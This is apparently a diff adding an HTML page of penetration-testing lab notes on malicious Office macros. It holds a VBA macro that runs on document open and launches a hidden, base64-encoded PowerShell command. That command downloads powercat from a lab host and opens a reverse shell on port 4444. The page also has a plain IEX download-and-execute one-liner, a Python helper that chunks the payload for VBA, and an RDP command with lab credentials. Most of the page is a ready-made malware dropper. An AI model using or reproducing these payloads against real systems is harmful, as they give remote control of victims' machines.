@@ -1,0 +1,49 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Macros</title>
+</head><body>ExifTool to know crucial data<br/>
+exiftool -a -u &lt;filename&gt;<br/>
+<br/>
+Canarytokens.org<br/>
+<br/>
+Sub AutoOpen() MyMacro End Sub Sub Document_Open() MyMacro End Sub Sub MyMacro() CreateObject("Wscript.Shell").Run "powershell" End Sub &nbsp; &nbsp;<br/>
+<br/>
+IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.8:8000/powercat.ps1');powercat -c 192.168.45.201 -p 4444 -e powershell &nbsp; <br/>
+<br/>
+str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxAC8AcABvAHcAZQByAGMAYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAAxACAALQBwACAAMQAyADMANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"<br/>
+<br/>
+n = 50<br/>
+<br/>
+for i in range(0, len(str), n):<br/>
+&#09;print("Str = Str + " + '"' + str[i:i+n] + '"')<br/>
+<br/>
+<br/>
+Sub AutoOpen()<br/>
+&nbsp; &nbsp; MyMacro<br/>
+End Sub<br/>
+<br/>
+Sub Document_Open()<br/>
+&nbsp; &nbsp; MyMacro<br/>
+End Sub<br/>
+<br/>
+Sub MyMacro()<br/>
+&nbsp; &nbsp; Dim Str As String<br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "ALgAxADYAOAAuADEALgA4AC8AcABvAHcAZQByAGMAYQB0AC4Ac"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "ABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQA"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "5ADIALgAxADYAOAAuADQANQAuADIAMAAxACAALQBwACAANAA0A"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Str = Str + "DQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwA"<br/>
+<br/>
+<br/>
+<br/>
+&nbsp; &nbsp; CreateObject("Wscript.Shell").Run Str<br/>
+End Sub<br/>
+<br/>
+<br/>
+<b>xfreerdp /u:offsec /p:lab /cert:ignore /v:192.168.225.194 &nbsp; </b></body></html>
